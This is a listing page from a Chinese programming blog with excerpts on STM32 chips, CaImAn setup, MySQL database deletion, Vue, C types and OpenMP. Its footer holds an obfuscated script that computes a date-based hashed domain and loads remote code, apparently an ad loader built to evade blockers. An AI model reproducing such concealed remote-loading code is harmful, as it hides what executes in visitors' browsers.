&lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;mysql&lt;/groupId&gt; &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt; &lt;scope&gt;runtime&lt;/scope&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.projectlombok&lt;/groupId&gt; &lt;artifactId&gt;lombok&lt;/artifactId&gt; &lt;version&gt;1.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8cc186c207f486f5ff427ddab5ae35ce/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c3be52fd08854516dff656f75f26ba97/" rel="bookmark">
			蓝桥杯嵌入式CT117E-M4学习笔记02-STM32G431RBT6芯片学习
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 前言一、芯片简介二、时钟学习三、SRAM学习四、总线矩阵学习五、GPIO学习总结 前言 首先学习了解一下蓝桥杯嵌入式CT117E-M4开发板的主控芯片STM32G431RBT6，本文仅为个人学习成果总结，如有错误，恳请指正。
一、芯片简介 上图为STM32CubeMX选型界面，如图可以看出STM32G431RBT6具有以下特点和硬件集成。
采用Cortex-M4 32位RISC核心架构，工作频率最高可达170Mhz。128kBytes的FLASH，32kBytes的SRAM。封装形式LQFP 64，引脚个数64pin，其中I/O个数52pin。CORDIC数学函数硬件加速，FMAC滤波函数硬件加速，CRC校验计算单元，RNG（Random Number Generator）随机数生成器。2个12位的adc，4个比较器，3个运算放大器，4个DAC通道（2个外部和2个内部），1个内部电压参考缓冲器。1个低功耗RTC（Real-Time Clock），1个通用32位定时器，2个16位PWM定时器（专用于电机控制），7个通用16位定时器，1个16位低功耗定时器。1个FDCAN，3个I2C，3个SPI和2个I2S冲突复用（其中的2个I2S和SPI引脚冲突），1个SAI（Serial Audio Interface）音频接口。3个USART，1个UART，1个低功耗UART，一个全速USB（12MBit/s）,1个UCPD。工作条件（略） 二、时钟学习 STM32G431时钟框图如下图所示。
1. STM32G431RBT6具有三个不同的时钟源可以提供SYSCLK系统时钟
4-48mhz高速振荡器与外部晶体或陶瓷谐振器(HSE)。它可以为系统锁相环提供时钟。HSE也可以配置为bypass，用于外部时钟。16mhz高速内部RC振荡器(HSI16)，可由软件微调。它可以为系统锁相环提供时钟系统锁相环（PLL），最大输出频率170 MHz。它可以用HSE16或HSI16时钟送电。 2. 带时钟恢复系统的RC48 (HSI48):内部的HSIRC48 MHz时钟源可用于驱动USB或RNG外设。
3. 辅助时钟源:两个超低功耗的实时时钟源
32.768 kHz低速外接晶体振荡器(LSE)，支持四种驱动能力模式。LSE也可以配置为bypass模式，使用外部时钟。32 kHz低速内部RC振荡器(LSI)，精度±5%，也用于时钟独立看门狗。 4. 外设时钟源:多个外设(I2S、USART、I2C、LPTimer、ADC、SAI、RNG)具有独立于系统时钟的时钟。
5. 时钟安全系统CSS (Clock security system):当HSE时钟发生故障时，系统时钟自动切换到HSI16，如果使能，则产生软件中断。也可以检测到LSE时钟故障并产生中断。
6. 时钟输出功能
MCO:微控制器时钟输出:它输出一个内部时钟供外部应用程序使用LSCO:低速时钟输出:在所有低功耗模式下输出LSI或LSE 三、SRAM学习 stm32G431 x6/x8/xB系列具有32kBytes的SRAM，但是这32k的SRAM被分为三个部分。
首先是16kBytes的SRAM被映射到地址0x2000 0000(SRAM1)，CPU可以通过系统总线(S-bus)进行控制，也可以通过指令/数据总线控制(I-but/O-but)（详见四、总线矩阵学习），SRAM1支持硬件奇偶校验。其次是6Kbytes被映射到地址0x2000 4000 (SRAM2),CPU只能通过系统总线进行控制，SRAM2可以保持在停止和待机模式。最后是10Kbytes被映射到地址0x1000 0000 (CCM SRAM),CPU主要通过指令/数据总线控制(I-but/O-but)，以获取最大的性能，它的别名也是0x2000 5800地址，所有主节点(CPU、DMA1、DMA2)都可以通过S-bus访问，这些S-bus与SRAM1和SRAM2相邻）。CCM SRAM支持硬件奇偶校验，可以以1kbyte的粒度进行写保护。内存可以在最大CPU时钟速度下读写，等待状态为0。 四、总线矩阵学习 STM32G431RBT6总线矩阵如下图所示。
ICode/Bus 总线 ICode 中的 I 表示 Instruction，即指令。我们写好的程序编译之后都是一条条指令，存放在 FLASH 中，内核要读取这些指令来执行程序就必须通过 ICode 总线，它几乎每时每刻都需要被使用，它是专门用来取指令的。DCode/Bus 总线 DCode 中的 D 表示 Data，即数据，那说明这条总线是用来取数据的。我们在写程序的时候，数据有常量和变量两种，常量就是固定不变的，用 C 语言中的 const 关键字修饰，是放到内部的 FLASH 当中的，变量是可变的，不管是全局变量还是局部变量都放在SRAM中。因为数据可以被 Dcode 总线和 DMA 总线访问，所以为了避免访问冲突，在取数 的时候需要经过一个总线矩阵来仲裁，决定哪个总线在取数据。S-Bus 系统总线 系统总线主要是访问外设的寄存器，我们通常说的寄存器编程，即读写寄存器都是通过这根系统总线来完成的DMA总线（Direct Memory Access）即直接存储器访问。主要用来传输数据，这个数据可以是某个外设的数据寄存存器，可以在SRAM，可以在内部的FLASH。AHB总线 （Advanced High performance Bus）高级高性能总线，主要用于内部的处理器，DMA，RAM，CORDIC，FMAC，DAC，ADC，CRC，GPIO等。APB总线（Advanced Peripheral Bus）外围总线，主要用于定时器，比较器和各种通信接口等。 五、GPIO学习 STM32G431RBT6具有51个GPIO口可以进行使用。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c3be52fd08854516dff656f75f26ba97/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1630b204f6d92e730857d330f1077ead/" rel="bookmark">
			Python CalmAn(Calcium Imaging Analysis)神经生物学工具包安装及环境配置过程
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 CalmAn简介安装要求我的设备 1&gt;CalmAn压缩包解压（caiman文件夹要改名）2&gt;conda创建虚拟环境3&gt;requirements依赖包配置（包括tensorflow）4&gt;caiman安装(mamba install)5&gt;caimanmanager.py install6&gt;PyCharm添加解释器7&gt;Demo演示8&gt;遇到的问题 本篇完成了基于 Windows 10 + Python3.9对CalmAn工具包的环境配置，由于使用了Anaconda，所以PyCharm与Jupyter Notebook都是可以借助配置好的虚拟环境运行的。 CalmAn简介 CalmAn是一个用于大规模钙成像数据分析和行为分析的Python工具箱。
CaImAn实施了大规模钙成像数据分析管道中所需的一套基本方法。针对多天胞体配准实验运动校正、源提取、尖峰反褶积和分量配准，实现了快速且可扩展的算法。它适用于双光子和单光子荧光显微镜数据，可以在批量处理和在线模式下运行；CaImAn还包含一些分析摄像机行为的例程。
GitHub仓:flatironinstitute/CaImAn
安装要求 目前，CaImAn在以下平台上运行并受支持：
64位x86 CPU上的Linux 64位x86 CPU上的MacOS 64位x86 CPU上的Windows 良好的体验需要32G RAM或更大的RAM。
CaImAn目前以Python 3.9为主。CaImAn的一部分是用C++编写的，但除了在安装期间之外，对用户来说是不可见的。
在Matlab中还有一个较旧的CaImAn实现（不支持，该版本可用于MCMC尖峰推断）
我的设备 硬件配置：
1. Windows 10 专业版 2. RAM：224GB（这是台服务器，PC应该也问题不大） 3. 64位x86 CPU 软件配置：
安装CalmAn前我的设备已预装过以下软件：
1. python3.9.12(conda虚拟环境下输入conda info查看，或在pycharm解释器配置里预览) 2. PyCharm 2022 社区版 3. Anaconda Navigator(anaconda3, conda version4.12.0) 配置过程中主要参考的文档：
Github仓-Install部分
一些贡献者事先告诉你的坑，尤其是windows上运行
新版CaImAn自动安装脚本 解决conda solving environment卡死
所以未安装以上软件的读者，请先自行安装完毕方可进行下列操作，包括pip等常用包。
由于本人是配置完成后才写的这篇博客，且考虑到CalmAn的安装及配置教程很少，旨在分享和记录，不打算卸了重来一遍（万一删错东西配坏了，很痛苦），所以步骤主要靠回忆，具体的指令可能会有偏差，但主体思路很清晰，遇到问题或报错，建议读者耐心追踪报错原因、查阅文档和资料思考如何解决问题。开发包环境配置都是这么踩坑过来的，长痛不如短痛…“一杯茶，一台机，一个环境配一天”
1&gt;CalmAn压缩包解压（caiman文件夹要改名） 将GitHub仓中下载的.zip文件解压至适当的目录下（我的由于是服务器，C盘足够大且稳定，就存在了默认位置）。
解压后得到以下文件：
注意，解压后请将caiman文件夹重命名，加一个s即可（改其他名应该也可行，配置时安装程序都能自动找到），否则使用conda配置时会遇到此类报错：
ImportError: cannot import name 'oasis' from partially initialized module 'caiman.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1630b204f6d92e730857d330f1077ead/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/cbfda57677ea519f5c682bcdc0f936c6/" rel="bookmark">
			MySQL删除数据库
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
一、drop命令删除数据库
二、使用mysqladmin删除数据库
三、使用PHP脚本删除数据库
一、drop命令删除数据库 使用普通用户登陆 MySQL 服务器，可能需要特定的权限来创建或者删除 MySQL 数据库，所以这边使用 root 用户登录，root 用户拥有最高权限。
在删除数据库过程中，务必要十分谨慎，因为在执行删除命令后，所有数据将会消失。
drop 命令格式：
drop database &lt;数据库名&gt;;
例如如果要删除名为TEST的数据库 ：
mysql&gt; drop database TEST;
二、使用mysqladmin删除数据库 同样也可以使用 mysql mysqladmin 命令在终端来执行删除命令。
以下实例删除数据库 TEST：
[root@host]# mysqladmin -u root -p drop TEST
Enter password:******
执行以上删除数据库命令后，会出现一个提示框，来确认是否真的删除数据库：
Dropping the database is potentially a very bad thing to do.
Any data stored in the database will be destroyed.
Do you really want to drop the 'RUNOOB' database [y/N] y
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/cbfda57677ea519f5c682bcdc0f936c6/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5a159c995e6e931a4bc3106ea255118a/" rel="bookmark">
			Vue案例
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		子组件$emit触发父组件绑定的的方法并传递数据。
this.$emit('事件',value:参数) //子传父 父组件调用子组件的方法，可以传递数据。
this.$refs.子组件的ref.子组件的方法 兄弟组件之间相互传递数据。//只要不是父子关系的都是兄弟关系
$on
给多选按钮绑定chang事件当选中或者取消选中的时候就会触发这个事件,然后可以通过e.target.checked的值true或者false来确定是否选中.
&lt;input type="checkbox" class="custom-control-input" id="cbFull" :checked="isfull" @change="fullchange"/&gt; methods:{ //e代表事件对象，此处e：input框 change(e){ this.$emit('fullchange',e.target.checked) } 1.@click，2.@input，2.自定义事件接收到的值被覆盖，三种情况考虑$event
头条案例 views文件夹与components的区别
views：组件通过路由来切换
components：组件不是通过路由来切换，该组件可复用
当使用第三方组件库时，有修改第三方组件默认样式的需求，需要用到/deep/
文件夹utils：放工具模块
例：request.js：封装api请求
购物车案例1 工程组件化
代码书写规范：
指令
属性绑定
绑定事件
//app.vue &lt;template&gt; &lt;div class="app-container"&gt; &lt;Header title="购物车案例"/&gt; &lt;!--循环渲染每一个商品的信息--&gt; &lt;Goods v-for="item in list" :key="item.id" :title="item.goods_name" :pic="item.goods_img" :price="item.goods_price" :state="item.goods_state"/&gt; &lt;/div&gt; &lt;/template&gt; &lt;script&gt; //导入axios请求库,调用方法拿数据 import axios from 'axios' //导入需要的组件 import Header from "./components/Header/Header"; import Goods from "./components/Goods/Goods"; export default { data(){ return{ //用来存购物车的列表数据，默认为空数组 list:[] } }, methods:{ //封装请求列表数据的方法 async initCartList() { //调用axios的get方法，返回值为promise //将axios请求封装到一个函数中，一会到created里面调用这个函数 //结构赋值axios中有六个属性，其中我们需要的是data属性，重命名为res const {data: res} = await axios.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5a159c995e6e931a4bc3106ea255118a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/dfff91543dc5debcc6937323019bab8c/" rel="bookmark">
			帮助有一定计算机基础的人 快速复习并重新拾起C语言基础（数据类型篇）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		数据类型
帮助有一定计算机基础的人 快速复习并重新拾起C语言基础 C语言数据类型分类基本数据类型整型类型的分类整型类型的基本用法有符号与无符号的区别字符型数据转义字符char 类型的范围浮点数类型数据字符串常量字符串输入之scanf函数字符输入输出函数算术运算符比较运算符强制类型转换运算符 C语言数据类型分类 基本数据类型 ①整型类型 ②浮点类型
2.枚举类型
3.空类型
4.派生类型
①指针类型 ②数组类型 ③结构体类型 ④共用体类型 ⑤函数类型
整型类型的分类 1.基本整型(int 型)
①占 2 个或者 4 个字节，由编译系统决定。
②以整数的补码形式存放。
2.短整型(short int)
以 Visual C++为例，占 2 个字节。
3.长整型(long int)
以 Visual C++为例，占 4 个字节。
4.双长整型(long long int)
以 Visual C++为例，占 8 个字节。
整型类型的基本用法 常用的打印格式
注意：
类型长度 long &gt; int &gt;short
小的数据类型赋值给大的数据类型，系统会自动转换。大的数据类型赋值给小的数据类型会损失高位。
有符号与无符号的区别 有符号数最高位表示符号位，0 为正数，1 为负数。
无符号数最高位是数值位，只能表示正数。
具体应用如下：
字符型数据 1.内存中没有字符，只有数字，存放字符实际上存放的是其 ASCII 码(即一个字符对应 一个数字的一张表)。
2.使用字符赋值和使用 ASCII 码赋值作用是一样的。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/dfff91543dc5debcc6937323019bab8c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f278194784e749b6878f7f00fe1c09ad/" rel="bookmark">
			水平集图像分割并行加速算法设计与实现(串行、OpenMP、CUDA)——OpenMP并行实现篇
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		本次水平集图像分割并行加速算法设计与实现包含：原理篇、串行实现篇、OpenMP并行实现篇与CUDA GPU并行实现篇四个部分。具体各篇章链接如下：
水平集图像分割并行加速算法设计与实现——原理篇水平集图像分割并行加速算法设计与实现——串行实现篇水平集图像分割并行加速算法设计与实现——OpenMP并行实现篇水平集图像分割并行加速算法设计与实现——CUDA GPU并行实现篇 原理篇主要讲解水平集图像分割的原理与背景。串行实现篇、OpenMP并行实现篇与CUDA GPU并行实现篇主要基于C++与OpenCV实现相应的图像分割与并行加速任务。本系列属于图像处理与并行程序设计结合类文章，希望对你有帮助😊。
PCAM设计与分析 根据陈国良院士在《并行算法实践》中的讲解，一般而言，并行程序的设计过程可以划分为4步：即任务划分(Partitioning)、通信(Communication)分析、任务组合(Agglomeration)和处理器映射(Mapping)，简称为PCAM设计过程，具体如下图所示。
这四个阶段可以简述为如下：
划分：将整个计算分解为一些小的任务，其目的是尽量开拓并行执行的机会；通信：确定诸任务执行中所需交换的数据和协调诸任务的执行，由此可检测上述划分的合理性；组合：按性能要求和实现的代价来考察前两阶段的结果，必要时可将一些小的任务组合成更大的任务，以提高性能或减少通信开销；映射：将每个任务分配到一个处理器上，其目的是最小化全局执行时间和通信成本以及最大化处理器的利用率。 本文后续将从上述四个阶段角度对所设计的OpenMP并行程序进行分析。
并行流程设计 本次OpenMP水平集图像分割并行加速算法的设计流程如上图所示。其分别在水平集初始化模块、Heaviside函数与Dirac函数计算以及演化模拟等模块进行数据并行；在曲率计算模块采用数据并行与任务并行结合的方式；在前景背景均值计算模块由于存在相应归并操作，在数据并行的同时需要设定临界区保护，具体主要模块的PCAM分析与实现如下节所示。
主要并行模块PCAM分析与实现 水平集初始化并行模块 针对该模块的PCAM分析如下：
划分：将图像处理任务按图像行进行划分，每N（进程数/图像高度）个行为一组。通信：各组仅需处理自身数据，无需通信。组合：各组不需要组合。映射：将各组映射到不同的处理器或进程，利用OpenMP库实现各组的并行计算。 在该模块的具体实现方面，其主要采用#pragma omp for语句，运用数据并行对初始化代码中的循环语句进行并行化，具体代码如下所示：
// 初始化水平集 void LevelSet::initializePhi(cv::Point2f center, float radius) { const float c = 2.0f; #pragma omp parallel shared(c) { float value = 0.0; #pragma omp for for (int i = 0; i &lt; src_.rows; i++) { for (int j = 0; j &lt; src_.cols; j++) { value = -sqrt(pow((j - center.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f278194784e749b6878f7f00fe1c09ad/">Read more…</a>
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/page/187/">«</a>
	<span class="pagination__item pagination__item--current">188/578</span>
	<a class="pagination__item pagination__item--next btn" href="/page/189/">»</a>
</div>

			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2023 编程随想.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>

<script src="https://www.w3counter.com/tracker.js?id=151182"></script>
<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>